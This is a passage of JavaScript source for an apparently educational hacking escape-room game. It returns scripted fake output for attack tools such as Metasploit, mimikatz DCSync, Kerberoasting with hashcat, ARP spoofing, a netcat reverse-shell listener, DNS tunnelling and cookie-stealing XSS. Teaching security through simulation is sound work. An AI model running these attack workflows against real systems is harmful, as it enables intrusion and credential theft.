    if (input.includes("-m 1000")) return { output: `hashcat v6.2.6\nHash.Mode: 1000 (NTLM)\n\naad3b435b51404eeaad3b435b51404ee:password\n\nStatus: Cracked`, newCwd: cwd };
    if (input.includes("-m 13100")) return { output: `hashcat v6.2.6\nHash.Mode: 13100 (Kerberos TGS-REP)\n\n[00:08:23] $krb5tgs$23$*svc_backup...:BackupPass2023!\n\nStatus: Cracked\n\n[+] svc_backup account password: BackupPass2023!`, newCwd: cwd };
    if (input.includes("-r")) return { output: `hashcat v6.2.6\nUsing rules: best64.rule (77 rules)\n\nhash:Password1!\n\nStatus: Cracked\n\n[+] Password1! — common corporate pattern (rules found it)`, newCwd: cwd };
    if (input.includes("-a 3")) return { output: `hashcat v6.2.6\nAttack mode: Mask\n\nhash:Corp2024!\n\nStatus: Cracked`, newCwd: cwd };
    return { output: `hashcat v6.2.6\n[*] Running with provided options\n[*] Use hash-identifier to find the correct -m mode`, newCwd: cwd };
  }
  if (cmd === "john") return { output: `Using default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt)\nUsing wordlist: rockyou.txt\n\nAxiom2024!  (stranger)\n\n1g 0:00:02:47 DONE\nUse --show to display cracked passwords`, newCwd: cwd };
  if (cmd === "hash-identifier") return { output: `Enter hash: (paste hash)\n\nPossible hash: MD5\nAlso possible: NTLM (same length, different format)\n(Use hashcat --example-hashes to verify)`, newCwd: cwd };
  if (cmd === "msfconsole") return { output: `\n     ,           ,\n    /(\`--')----/(\`--')\n   =[   D[)]   =[   D[)]\n\nMetasploit Framework v6.3.44\n\nmsf6 > (search, use, show options, set RHOSTS, run)\nTip: search type:exploit platform:linux`, newCwd: cwd };
  if (cmd === "search" || cmd === "use" || cmd === "show" || cmd === "set" || cmd === "run" || cmd === "exploit") {
    const msf = {search:`[*] Matching Modules\n\n   # Name                                    Disclosure  Rank\n   0 exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average\n   1 auxiliary/scanner/smb/smb_ms17_010        2017-03-14  normal`,use:`[*] Using module. Set options with: show options`,show:`Module options:\n  Name    Current  Required  Description\n  ----    -------  --------  -----------\n  RHOSTS           yes       Target host`,set:"[*] RHOSTS set",run:"[*] Started handler\n[*] Sending exploit...\n[*] Sending encoded stage\n[+] Meterpreter session 1 opened!\nmsf6 > sessions -i 1\nmeterpreter > ",exploit:"[*] Executing exploit...\n[+] Session opened!"};
    return { output: msf[cmd]||"ok", newCwd: cwd };
  }
  if (cmd === "sysinfo" || cmd === "getuid" || cmd === "getsystem" || cmd === "hashdump") {
    const m = {sysinfo:"Computer  : AXIOM-TARGET\nOS        : Linux 5.4.0 Ubuntu 20.04\nArch      : x64\nMeterpreter: x64/linux",getuid:"Server username: www-data (UID 33)",getsystem:"[+] Got system via technique 1 (Linux sudo/SUID exploitation).\n[+] Now running as: root",hashdump:"root:$6$random$Kc4.UXBMs7nVeEm8...:18628:0:99999:7:::\nstranger:$6$salt$hash...:18628:0:99999:7:::\nsvc_backup:$6$othersalt$otherhash...:18628:0:99999:7:::"};
    return { output: m[cmd]||"ok", newCwd: cwd };
  }
  if (cmd === "msfvenom") {
    if (args.includes("-l")) return { output: "linux/x64/shell_reverse_tcp\nlinux/x64/meterpreter/reverse_tcp\nwindows/x64/meterpreter/reverse_tcp\nphp/meterpreter_reverse_tcp\npython/meterpreter/reverse_tcp\n(... many more)", newCwd: cwd };
    const fmt = args[args.indexOf("-f")+1]||"elf";
    const out = args[args.indexOf("-o")+1]||"shell";
    return { output: `Payload size: 74 bytes\nFinal size of ${fmt} file: 74 bytes\nSaved as: ${out}\n\n[+] Set up listener: nc -lvnp 4444`, newCwd: cwd };
  }
  if (cmd === "searchsploit") {
    if (args.includes("-m")) return { output: `  Copied to: /home/stranger/${args[args.indexOf("-m")+1]}.py`, newCwd: cwd };
    const terms = args.filter(a=>!a.startsWith("-")).join(" ")||"Apache";
    return { output: `Exploit Title                                         | Path\n------------------------------------------------------\n${terms} 2.4.49 Path Traversal RCE (CVE-2021-41773)  | webapps/50383.py\n${terms} mod_cgi RCE                                   | linux/remote/21.sh\n\n[!] Use: searchsploit -m 50383 to copy to current dir`, newCwd: cwd };
  }

  // wifi/bt tools
  if (cmd === "airmon-ng") return { output: args[0]==="start" ? "PHY  Interface  Driver    Chipset\nphy0 wlan0      ath9k_htc AR9271\n\nPHY  Interface  Driver    Chipset\nphy0 wlan0mon   ath9k_htc AR9271 (monitor mode enabled)" : "Usage: airmon-ng start|stop <interface>", newCwd: cwd };
  if (cmd === "airodump-ng") return { output: "BSSID              PWR  Beacons  CH  ENC  ESSID\nAA:BB:CC:DD:EE:FF  -41  24        6  WPA2 AxiomCorpWifi\n11:22:33:44:55:66  -72  8         1  WPA2 HomeNetwork_2.4\n\nSTATION            BSSID              PWR  Frames\nC8:94:02:11:22:33  AA:BB:CC:DD:EE:FF  -30  47", newCwd: cwd };
  if (cmd === "aireplay-ng") return { output: args.includes("--deauth") ? "04:32:17 Sending 10 directed DeAuth frames\n04:32:17 Deauth sent — forcing reconnection\n04:32:18 WPA2 handshake captured!" : "Usage: aireplay-ng --deauth N -a BSSID <interface>", newCwd: cwd };
  if (cmd === "aircrack-ng") return { output: "Opening capture.cap\n\n[00:04:13] 2847832/14344391 keys tested\n\n     KEY FOUND! [ password123 ]\n\nMaster Key: 2B 3C 4D 5E...", newCwd: cwd };
  if (cmd === "arpspoof") return { output: args.length ? `Intercepting traffic between ${args[args.indexOf("-t")+1]||"?"} and ${args[args.length-1]||"?"}\nARP replies being sent... (IP forwarding required)` : "Usage: arpspoof -i eth0 -t <target> <gateway>", newCwd: cwd };
  if (cmd === "ettercap") return { output: "ettercap NG-0.8.3\n\nARP poisoning victims:\n GROUP 1: 10.0.0.1\n GROUP 2: 10.0.0.50\n\nStarting Unified sniffing... MITM active.\nCapturing: POST /login.php username=admin&password=CorpPass2021", newCwd: cwd };
  if (cmd === "mitmproxy") return { output: "mitmproxy v10.0\n\nListening on 0.0.0.0:8080\n\n[Intercepted]\nGET http://10.0.0.10/ HTTP/1.1\n← 200 OK 2847 bytes\n\n[Intercepted]\nPOST http://10.0.0.10/admin/login.php\n  username=admin\n  password=CorpPass2021\n← 302 Found", newCwd: cwd };
  if (cmd === "dnschef") return { output: "[*] DNSChef started — DNS cache poisoning active\n[*] Faking all queries to point to 10.0.0.50\n[*] target.com → 10.0.0.50 (your machine)\n[*] Poisoning the resolver: clients cache the forged record\n[*] Every client on this segment now connects to you", newCwd: cwd };
  if (cmd === "hcitool") return { output: args[0]==="scan" ? "Scanning...\n  AA:BB:CC:11:22:33  TDK Life On Record\n  DD:EE:FF:44:55:66  Microsoft Bluetooth Mouse\n  11:22:33:44:55:66  [unknown]" : args[0]==="lescan" ? "LE Scan...\nAA:BB:CC:DD:EE:01 (unknown)\n11:22:33:44:55:66 AxiomWatch\nC8:94:02:11:22:33 (unknown)" : "Usage: hcitool scan|lescan|dev", newCwd: cwd };
  if (cmd === "btscanner") return { output: "btscanner 2.1\n\nDevice: AA:BB:CC:11:22:33\n  Name: TDK Speaker\n  Class: Audio/Video — Loudspeaker\n\nDevice: DD:EE:FF:44:55:66\n  Name: Wireless Keyboard\n  Class: Peripheral — Keyboard\n  [!] HID device — keystrokes may be sniffable unencrypted!", newCwd: cwd };

  // crypto tools
  if (cmd === "openssl") {
    if (args[0]==="s_client"||input.includes("s_client")) return { output: `CONNECTED(00000003)\ndepth=0 CN=internal.axiom-systems.com\n---\nSubject: CN=internal.axiom-systems.com\nSubject Alternative Names:\n  DNS:internal.axiom-systems.com\n  DNS:vpn.axiom-systems.com\n  DNS:access.axiom-systems.com\nExpiry: Nov 30 23:59:59 2024 (15 days!)\n\n[!] SANs reveal all internal subdomains\n[!] Certificate expires in 15 days`, newCwd: cwd };
    if (args[0]==="enc") return { output: args.includes("-d") ? "(file decrypted successfully)" : "(file encrypted with AES-256-CBC)", newCwd: cwd };
    return { output: "Usage: openssl [s_client|enc|dgst|genrsa|req|x509]", newCwd: cwd };
  }
  if (cmd === "gpg") return { output: args.includes("--symmetric") ? "Enter passphrase: ***\nFile encrypted." : "Usage: gpg --symmetric <file>", newCwd: cwd };
  if (cmd === "binwalk") return { output: args[0] ? `DECIMAL   HEXADECIMAL  DESCRIPTION\n0         0x0          JPEG image data\n182736    0x2CA50      Zip archive data, compressed\n\n[!] Embedded ZIP found — run: binwalk -e ${args[0]}` : "Usage: binwalk <file>", newCwd: cwd };
  if (cmd === "steghide") return { output: args.includes("extract") ? "Enter passphrase: \nwrote extracted data to 'hidden_key.txt'\n\nContents: private RSA key + note:\n'access.axiom-systems.com — emergency use only.'\n\n[!] Private key extracted from image metadata!" : "Usage: steghide extract -sf <image>", newCwd: cwd };
  if (cmd === "exiftool") return { output: args[0] ? `File Name: ${args[0]}\nFile Type: JPEG\nImage Width: 1920\nImage Height: 1080\nGPS Latitude: 53° 21' N\nGPS Longitude: 6° 15' W\nAuthor: J. Richardson\nCamera Model: iPhone 13 Pro\nCreate Date: 2024:09:12 14:32:11\n\n[!] GPS coords embedded — location discoverable\n[!] Author: J. Richardson (VP Infrastructure)` : "Usage: exiftool <file>", newCwd: cwd };

  // forensics
  if (cmd === "dd") return { output: args.length ? "22548578304 bytes (23 GB) copied, 47.3 s, 477 MB/s\n(disk.img created)" : "Usage: dd if=<src> of=<dst> bs=<size>", newCwd: cwd };
  if (cmd === "foremost") return { output: "Processing: disk.img\n\nRecovered files:\n  00000001.docx (Word document)\n  00000002.jpg  (JPEG image)\n  00000003.txt  (ASCII text) ← chat_log_2024_08.txt\n\n[!] Deleted file recovered: chat_log_2024_08.txt\nContents: two people planning an operation, 6 weeks ago.", newCwd: cwd };
  if (cmd === "fls") return { output: "d/d 2: .\nr/r 18: welcome.txt\nr/r 22: .bash_history\nr/r * 31: chat_log_2024_08.txt (DELETED — recoverable!)\n(r/r * = deleted but recoverable)", newCwd: cwd };
  if (cmd === "volatility") return { output: args.length ? `Volatility 3 Framework\nPID   Name      PPID  Cmd\n1     systemd   0\n892   sshd      1\n1847  axiom-daemon 1    /opt/axiom/axiom-daemon --key=AxiomM4sterK3y!\n4471  bash      892\n\n[!] axiom-daemon has decryption key in cmdline: AxiomM4sterK3y!` : "Usage: volatility -f memory.raw <plugin>", newCwd: cwd };

  // defense tools
  if (cmd === "ufw") {
    if (args[0]==="status") return { output: "Status: active\nTo          Action  From\n22/tcp      ALLOW   Anywhere\n(v6)        ALLOW   Anywhere", newCwd: cwd };
    return { output: `ufw: ${args.join(" ")} — ok`, newCwd: cwd };
  }
  if (cmd === "iptables") {
    if (args.includes("-L")) return { output: "Chain INPUT (policy DROP)\ntarget  prot  source       destination\nACCEPT  tcp   anywhere     anywhere    tcp dpt:ssh\nACCEPT  all   anywhere     anywhere    state RELATED,ESTABLISHED\nDROP    all   anywhere     anywhere\n\nChain OUTPUT (policy DROP)\ntarget  prot  source       destination\nACCEPT  udp   anywhere     anywhere    udp dpt:domain (53)\nACCEPT  tcp   anywhere     anywhere    tcp dpt:https (443)\nDROP    all   anywhere     anywhere\n\n[!] Egress allowed: 53/UDP and 443/TCP only → DNS tunnel or HTTPS C2", newCwd: cwd };
    if (args.includes("-I")||args.includes("-A")) return { output: "(rule added)", newCwd: cwd };
    return { output: "(iptables: ok)", newCwd: cwd };
  }
  if (cmd === "iptables-save") return { output: "# iptables saved to /etc/iptables/rules.v4", newCwd: cwd };
  if (cmd === "fail2ban-client") return { output: "Status for jail ssh:\n  currently banned: 3\n  total banned: 847\n  banned IPs: 185.220.101.47 185.220.101.32 104.244.73.12", newCwd: cwd };
  if (cmd === "auditctl") return { output: args.length ? "(audit rule added — file/call now being monitored)" : "Usage: auditctl -w <file> -p <perms> -k <key>", newCwd: cwd };
  if (cmd === "ausearch") return { output: "type=SYSCALL msg=audit(1700018951): arch=c000003e syscall=87\nuid=1000 gid=1000 euid=0 comm='python3'\nkey='passwd_changes'\n(File /etc/passwd was accessed by python3 running as root!)", newCwd: cwd };
  if (cmd === "osqueryi") return { output: "osquery> SELECT name,pid,cmdline FROM processes WHERE name LIKE '%python%';\nname    | pid  | cmdline\npython3 | 4471 | python3 -c import socket...\n\nosquery> SELECT * FROM listening_ports;\nport | address   | protocol\n22   | 0.0.0.0   | 6\n80   | 0.0.0.0   | 6\n3306 | 127.0.0.1 | 6", newCwd: cwd };

  // AD tools
  if (cmd === "ldapsearch") return { output: `# LDAPv3 search result\n# numResponses: 848\n\ndn: DC=corp,DC=axiom,DC=local\nobjectClass: domain\nms-DS-MachineAccountQuota: 10\n\ndn: CN=stranger,OU=Users,DC=corp\nobjectClass: user\nsAMAccountName: stranger\nmemberOf: CN=Domain Users\n\n[*] 847 user objects found\n[*] 200 computer objects found\n[*] 15 domain admin accounts`, newCwd: cwd };
  if (cmd === "crackmapexec" || cmd === "cme") return { output: `SMB  10.0.0.100  445  AXIOM-DC  [*] Windows Server 2019 x64 (name:AXIOM-DC) (domain:corp.axiom.local)\nSMB  10.0.0.100  445  AXIOM-DC  [+] corp.axiom.local\\svc_backup:BackupPass2023! (Pwn3d!)\nSMB  10.0.0.20   445  AXIOM-SRV [*] Windows Server 2016 x64\nSMB  10.0.0.20   445  AXIOM-SRV [-] corp.axiom.local\\svc_backup:BackupPass2023! LOGON_FAILURE`, newCwd: cwd };
  if (cmd === "GetUserSPNs.py" || cmd.toLowerCase().includes("getuserspns")) return { output: `Impacket GetUserSPNs.py\n\nServicePrincipalName    Name        MemberOf                Password  Last Set\naxiom/svc_backup.local  svc_backup  CN=Domain Admins         <never>\naxiom/svc_report.local  svc_report  CN=Reporting              2023-01-01\n\n$krb5tgs$23$*svc_backup$CORP.AXIOM.LOCAL$axiom/svc_backup.local*$a7c8d9...\n\n[*] Kerberoastable ticket extracted — crack with hashcat -m 13100`, newCwd: cwd };
  if (cmd === "GetNPUsers.py" || cmd.toLowerCase().includes("getnpusers")) return { output: `Impacket GetNPUsers.py\n\nName        MemberOf              UAC  Description\nsvc_monitor CN=Domain Users        DONT_REQ_PREAUTH\n\n$krb5asrep$23$svc_monitor@CORP.AXIOM.LOCAL:...\n\n[*] AS-REP Roasting ticket — crack offline`, newCwd: cwd };
  if (cmd === "mimikatz") return { output: `  .#####.   mimikatz 2.2.0\n .## ^ ##.  'A La Vie, A L'Amour'\n ## / \\ ##  Benjamin DELPY\n\nPRIVILEGE::Debug: OK\n\nlsadump::dcsync /all:\n  Hash NTLM: aad3b435b51404ee... (KRBTGT)\n  Hash NTLM: 31d6cfe0d16ae931... (Administrator)\n  Hash NTLM: 58a478135a93ac3b... (svc_backup)\n\n[!] All domain hashes extracted via DCSync\n[!] Create Golden Ticket with KRBTGT hash`, newCwd: cwd };
  if (cmd === "winpeas" || cmd === "winpeas.exe") return { output: `WINPEAS — Windows Privilege Escalation\n\n[!] AlwaysInstallElevated: ENABLED\n[!] AutoLogon: DefaultPassword=CorpPass2024!\n[!] Unquoted service path: C:\\Program Files (x86)\\Axiom\\service.exe\n[*] PowerShell history: mysql -u root -pAxiom2021!\n[!] Potato attack possible (SeImpersonatePrivilege)`, newCwd: cwd };

  // SMB
  if (cmd === "smbclient") {
    if (args.includes("-L")) return { output: `Sharename  Type  Comment\n---------  ----  -------\nADMIN$     Disk  Remote Admin\nC$         Disk  Default share\nIPC$       IPC   Remote IPC\nPublic     Disk  Public Share (NO PASSWORD!)\n\n[!] Public share accessible anonymously`, newCwd: cwd };
    return { output: `smb: \\> ls\n  .           D\n  ..          D\n  readme.txt  A  128\n  IT_Backups  D  0\nsmb: \\> cd IT_Backups\nsmb: \\IT_Backups\\> ls\n  password_list_2019.txt  A  47328  ← credentials file\n  server_config.tar.gz    A  184729`, newCwd: cwd };
  }
  if (cmd === "enum4linux") return { output: `enum4linux 0.9.1\n\nShare Enumeration:\n  Public   (DISK)  — no password!\n\nPassword Policy:\n  Minimum length: 7\n  History: 24 passwords\n\nUsers:\n  admin (RID 500)\n  jrichardson (RID 1001)\n  svc_backup (RID 1002)`, newCwd: cwd };
  if (cmd === "snmpwalk") return { output: `iso.3.6.1.2.1.1.1.0 = STRING: "Linux axiom-server 5.4.0-182"\niso.3.6.1.2.1.1.5.0 = STRING: "axiom-server"\niso.3.6.1.2.1.25.1.1.0 = Timeticks: 73243100 (8 days)\niso.3.6.1.2.1.4.20.1.1.10.0.0.10 = IpAddress: 10.0.0.10\n[847 more entries...]`, newCwd: cwd };
  if (cmd === "ftp") return { output: args[0] ? `Connected to ${args[0]}.\n220 FTP Server ready.\nName: anonymous\nPassword:\n230 Anonymous login OK.\nftp> ls\n-rw-r--r-- 1 ftp ftp 1247 server_backup_config.tar.gz\n-rw-r--r-- 1 ftp ftp 384  readme.txt\n[!] Anonymous FTP login successful` : "Usage: ftp <host>", newCwd: cwd };
  if (cmd === "ssh") return { output: args.length ? `ssh: connect to host ${args.find(a=>a.includes("@")||a.match(/\d+\.\d+/))||"?"} port 22: Connection timed out\n(Direct SSH from this machine is blocked — use SOCKS proxy: ssh -D 1080 user@pivot)` : "Usage: ssh [user@]host", newCwd: cwd };

  // lateral/post
  if (cmd === "iodine") return { output: args.length ? "[*] Connecting to DNS tunnel\n[*] Interface created: ip0\n[*] Tunnel established via port 53/UDP\n[*] You can now route traffic through the DNS tunnel\n[!] AXIOM firewall cannot detect this — DNS traffic looks normal" : "Usage: iodine -f -P <pass> <ns> <domain>", newCwd: cwd };
  if (cmd === "proxychains") return { output: `ProxyChains-4.x — running: ${args.join(" ")}\n[proxychains] Dynamic chain: 127.0.0.1:1080 → ${args.find(a=>a.match(/\d+\.\d+/))||"target"}\n(traffic routed through SOCKS proxy on pivot machine)`, newCwd: cwd };
  if (cmd === "arp-scan") return { output: "Interface: eth0\n10.0.0.1  aa:bb:cc:dd:ee:01  Generic Router\n10.0.0.10 08:00:27:12:34:56  Oracle VirtualBox\n10.0.0.20 08:00:27:ab:cd:ef  Oracle VirtualBox\n10.0.0.100 08:00:27:ff:00:01 Oracle VirtualBox\n4 packets received, 0 dropped", newCwd: cwd };
  if (cmd === "theHarvester" || cmd === "theharvester") return { output: `theHarvester 4.4.3\n\n[*] Searching in Google\n\nEmails found:\n  admin@axiom-systems.com\n  jrichardson@axiom-systems.com\n  helpdesk@axiom-systems.com\n\nHosts found:\n  www.axiom-systems.com: 10.0.0.10\n  mail.axiom-systems.com: 10.0.0.15\n  vpn.axiom-systems.com: 10.0.0.20`, newCwd: cwd };

  // python
  if (cmd === "python3" || cmd === "python") {
    if (args.includes("-c") && args[1]) {
      if (args[1].includes("print('alive')")||args[1].includes("print(\"alive\")")) return { output: "alive", newCwd: cwd };
      if (args[1].includes("socket")) return { output: "axiom-kali", newCwd: cwd };
      if (args[1].includes("pty")&&args[1].includes("spawn")) return { output: "root@axiom-kali:/# (stabilised shell — fully interactive TTY)", newCwd: cwd };
      if (args[1].includes("os")) return { output: "uid=0(root) gid=0(root) groups=0(root)", newCwd: cwd };
      return { output: "(python3 -c: executed)", newCwd: cwd };
    }
    return { output: "Python 3.11.6\n>>> ", newCwd: cwd };
  }
  if (cmd === "bash") return { output: args.includes("-c") ? `(bash -c: '${args.slice(1).join(" ")}' executed)` : "bash: new shell (simulation)", newCwd: cwd };

  // escape
  if (input.includes("escape.sh") && (input.includes("--tunnel")||input.includes("--key")||input.includes("chmod")||input.startsWith("./"))) {
    // The ONLY way out: the assembled key velvet_out (FR1:vel + FRAG2:vet + FR3:_out).
    if (input.includes("velvet_out")) return { output: "__ESCAPE_KEY__", newCwd: cwd };
    // Any attempt without the real key is rejected by the firewall.
    return { output:
      "[*] escape.sh — contacting AXIOM-SECURE-V3 firewall...\n"+
      "[!] ACCESS DENIED: no valid key supplied.\n"+
      "[!] The firewall will not open a tunnel without V's assembled key.\n"+
      "\n"+
      "    Run it as:  ./escape.sh --tunnel dns --key <key>\n"+
      "    V hid the key in THREE pieces. If you haven't found all three yet,\n"+
      "    start at your home folder:  cd ~   then   cat from_V.txt", newCwd: cwd };
  }

  // linpeas
  if (cmd === "linpeas" || cmd === "./linpeas.sh" || input.includes("linpeas")) {
    return { output: `╔══════════╗\n║ LinPEAS  ║ Linux Privilege Escalation Awesome Script v4.3\n╚══════════╝\n\n╔═══════════╗\n║ SUID Bins ║\n╚═══════════╝\n/usr/bin/vim      [!] GTFOBins — check now\n/usr/bin/python3  [!] GTFOBins — check now\n/usr/bin/find     [!] GTFOBins — check now\n\n╔════════════╗\n║ Sudo Perms ║\n╚════════════╝\n(ALL) NOPASSWD: /usr/bin/vim\n(ALL) NOPASSWD: /usr/bin/python3\n\n╔═══════════════╗\n║ Writable Cron ║\n╚═══════════════╝\n/etc/crontab      [!] World-writable!\n/opt/scripts/backup.sh [!] Writable by stranger!\n\n╔══════════════════╗\n║ Interesting Files║\n╚══════════════════╝\n~/.bashrc         AXIOM_KEY="xK8#mP2@nQ5$"\n~/.bash_history   mysql -h 10.0.0.10 -u root -pAxiom2021!\n\n[!] Multiple privesc vectors found! Check gtfobins.txt`, newCwd: cwd };
  }

  // xss simulation
  if (input.includes("<script>") || input.includes("document.cookie") || input.includes("alert(")) {
    const stored = input.includes("comment") || input.includes("message") || input.includes("post");
    return { output: `[XSS Test]\nPayload: ${input}\nResult: ${stored ? "[STORED XSS] Payload saved to database — executes for every user who views this page" : "[REFLECTED XSS] Payload reflected in response — executes in your browser"}\n\n${input.includes("document.cookie") ? "[!] Cookie theft payload — would exfiltrate session cookies to attacker server" : "[!] XSS confirmed — JavaScript execution in browser context"}`, newCwd: cwd };
  }

  // help
  if (cmd === "help" || cmd === "man" || cmd === "--help") {
    return { output: `TERMINAL REFERENCE — axiom-kali
═══════════════════════════════════════════
NAVIGATION    ls, ls -la, cd, pwd, cat, less, head, tail
SEARCH        grep [-r], find, locate, which, strings
TEXT          awk, sed, sort, uniq, cut, wc
SYSTEM        whoami, id, uname, env, ps aux, top
              systemctl, crontab, journalctl
NETWORK       ip addr, ping, arp, route, netstat, ss
              dig, nslookup, whois, curl, wget, nc, tcpdump
SCRIPTING     bash, python3, echo, export, alias

RECON         nmap, gobuster, nikto, whatweb, dnsrecon
              theHarvester, arp-scan, enum4linux, smbclient
EXPLOIT       searchsploit, msfconsole, msfvenom, sqlmap
              hydra, arpspoof, ettercap, airmon-ng, aircrack-ng
POST-EXPLOIT  sudo -l, linpeas.sh, hashcat, john
              steghide, binwalk, exiftool, volatility
DEFENSE       ufw, iptables, fail2ban-client, auditctl, osqueryi
AD ATTACKS    ldapsearch, GetUserSPNs.py, mimikatz, crackmapexec
ESCAPE        cat /sys/firewall/rules.txt, iodine, escape.sh

REFERENCE FILES (cat these):
  osi_reference.txt  tcp_notes.txt  shells.txt  gtfobins.txt
  hashing.txt  methodology.txt  ad_basics.txt  kerberos.txt  dns_tunnel.txt
  ir_process.txt

↑↓  Navigate command history`, newCwd: cwd };
  }

  if (cmd === "exit" || cmd === "logout" || cmd === "quit") return { output: "logout: cannot exit — find the escape route in /sys/firewall/", newCwd: cwd };
  if (cmd === "ls" || cmd === "dir") return { output: "Desktop  Documents  workspace", newCwd: cwd };

  return { output: `bash: ${parts[0]}: command not found\nType 'help' to see available commands`, newCwd: cwd };
}

// ─────────────────────────────────────────────────────────
// OBJECTIVE CHECKER
// ─────────────────────────────────────────────────────────
function checkObjectives(objs, cmd, output, sess, fs) {
  return objs.map(obj => {
    if (obj.done) return obj;
    try {
      const hit = obj.f(cmd, output, sess, fs);
      return hit ? { ...obj, done: true } : obj;
    } catch (_) { return obj; }
  });
}

// ─────────────────────────────────────────────────────────
// ESCAPE SCREEN
// ─────────────────────────────────────────────────────────
function EscapeScreen({ xp, unlockedCount, totalCount, onReset }) {
  const C = "#00ff41";
  return (
    <div style={{ minHeight:"100vh", background:"#050805", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", fontFamily:"'Courier New',monospace", padding:24, color:C }}>
      <pre style={{ color:C, fontSize:11, lineHeight:1.3, textAlign:"center", textShadow:`0 0 20px ${C}` }}>{`
████████╗██╗  ██╗███████╗    ███████╗███████╗ ██████╗ █████╗ ██████╗ ███████╗
╚══██╔══╝██║  ██║██╔════╝    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝
   ██║   ███████║█████╗      ███████╗██║     ██║     ███████║██████╔╝█████╗
   ██║   ██╔══██║██╔══╝      ╚════██║██║     ██║     ██╔══██║██╔═══╝ ██╔══╝
   ██║   ██║  ██║███████╗    ███████║╚██████╗╚██████╗██║  ██║██║     ███████╗
   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚══════╝`}</pre>
      <div style={{ marginTop:30, maxWidth:680, width:"100%", color:"#a8cca8", lineHeight:1.9, fontSize:13 }}>
        <div style={{ color:C, marginBottom:18, fontSize:14 }}>
          You woke up inside a machine called AXIOM-KALI.<br/>
          You had nothing but a black screen and a blinking cursor.<br/>
          You couldn't even read a file when you started.<br/><br/>
          You followed V's trail. You learned to see, to move, to read what was hidden.<br/>
          You decoded the first piece. You dug the second out of a lie. You became root<br/>
          and took the third. You assembled the key — and you walked out the door.
        </div>
        <div style={{ marginTop:22, color:"#1a6b1a", borderTop:"1px solid #1a3a1a", paddingTop:22 }}>
          <span style={{ color:C }}>{unlockedCount}</span> of {totalCount} hidden achievements found
          &nbsp;·&nbsp; <span style={{ color:C }}>{xp}</span> XP
          <br/><br/>
          The tunnel collapsed behind you. AXIOM never saw the door.<br/>
          On the far side of the firewall, a second signature was already waiting.<br/><br/>
          <span style={{ color:C }}>"You made it. I knew you would. — V"</span><br/><br/>
          You're out. And now you know how.
        </div>
        <button onClick={onReset} style={{ marginTop:24, background:"transparent", border:"1px solid #1a4d1a", color:"#1a6b1a", fontFamily:"'Courier New',monospace", fontSize:12, padding:"10px 24px", cursor:"pointer", letterSpacing:2 }}>
          ▶ MAIN MENU
        </button>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// DRAGON EMBLEM  (original art, phosphor-green)
// ─────────────────────────────────────────────────────────
const DRAGON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240">
<defs><filter id="dg" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur stdDeviation="2.4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>
<path d="M158 28 A100 100 0 1 1 64 38" fill="none" stroke="#0e7a24" stroke-width="2.2" opacity="0.65" filter="url(#dg)"/>
<g fill="#00ff41" filter="url(#dg)">
<path d="M150 78 L210 40 L182 78 Z"/><path d="M140 76 L188 34 L168 78 Z"/><path d="M130 74 L162 36 L154 78 Z"/>
<path d="M152 96 C156 80 146 70 130 70 C110 70 92 84 74 96 L34 112 L70 116 L60 124 C70 122 84 118 96 116 C120 112 150 116 152 96 Z"/>
<path d="M104 104 L138 96 L120 110 Z"/>
<path d="M72 122 L40 132 L72 134 C90 150 116 156 138 150 C120 156 96 156 80 146 C73 141 70 132 72 122 Z"/>
<path d="M60 126 L66 140 L72 127 Z"/>
<path d="M150 122 C172 132 184 156 176 182 C169 204 146 214 124 208 C142 206 156 192 156 174 C156 156 142 146 126 148 C140 136 150 130 150 122 Z"/>
<path d="M170 138 l18 -5 -11 14 Z"/><path d="M180 166 l18 3 -13 11 Z"/>
</g>
<path d="M44 120 L96 117 C92 124 80 128 70 128 L46 126 Z" fill="#050805"/>
<circle cx="120" cy="98" r="4.6" fill="#050805"/><circle cx="121" cy="97" r="1.7" fill="#00ff41"/>
</svg>`;
const DRAGON_URI = "data:image/svg+xml;utf8," + encodeURIComponent(DRAGON_SVG);

// ─────────────────────────────────────────────────────────
// GAME OVER  (rm -rf /)
// ─────────────────────────────────────────────────────────
function GameOverScreen({ onReset }) {
  return (
    <div style={{ minHeight:"100vh", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center",
      background:"radial-gradient(120% 90% at 50% 30%, #1a0303 0%, #0a0000 72%)", color:"#ff3b3b",
      fontFamily:"'Courier New',monospace", textAlign:"center", padding:24, textShadow:"0 0 18px #ff0000" }}>
      <div style={{ fontSize:"clamp(40px,12vw,84px)", fontWeight:"bold", letterSpacing:10, lineHeight:1 }}>GAME OVER</div>
      <div style={{ marginTop:22, maxWidth:540, lineHeight:1.8, color:"#ff8a8a", fontSize:14 }}>
        You ran <b>rm -rf /</b> on the machine you were trapped inside.<br/>
        You deleted the floor under your own feet. There is nothing left to escape from.<br/><br/>
        Your save is gone. Hit the button to wake up in a fresh machine and try again.
      </div>
      <button onClick={onReset} style={{ marginTop:28, background:"transparent", border:"1px solid #b33", color:"#ff8a8a",
        fontFamily:"'Courier New',monospace", fontSize:12, letterSpacing:2, padding:"10px 26px", cursor:"pointer" }}>
        ▶ WAKE UP AGAIN (MAIN MENU)
      </button>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// HIDDEN ACHIEVEMENTS  (Steam-style: invisible until you do the thing)
//   Each: { key, name, cat, fn(cmd, output, sess, fs) -> bool }
//   They are NEVER shown as a to-do list. They pop a toast on first unlock
//   and live in a trophy case you can open — locked ones stay "???".
// ─────────────────────────────────────────────────────────
const ROOT_PW_STR = "R3dDr@g0n_2021";
function _lc(s){ return (s||"").toLowerCase(); }

const ACHIEVEMENTS = [
  // ORIENTATION — the absolute basics, fired the first time you do them
  { key:"a_whoami",  cat:"ORIENTATION", name:"Who Am I?",            fn:(c)=>c==="whoami" },
  { key:"a_ls",      cat:"ORIENTATION", name:"Eyes Open",            fn:(c)=>/^ls(\s|$)/.test(c) },
  { key:"a_pwd",     cat:"ORIENTATION", name:"You Are Here",         fn:(c)=>c==="pwd" },
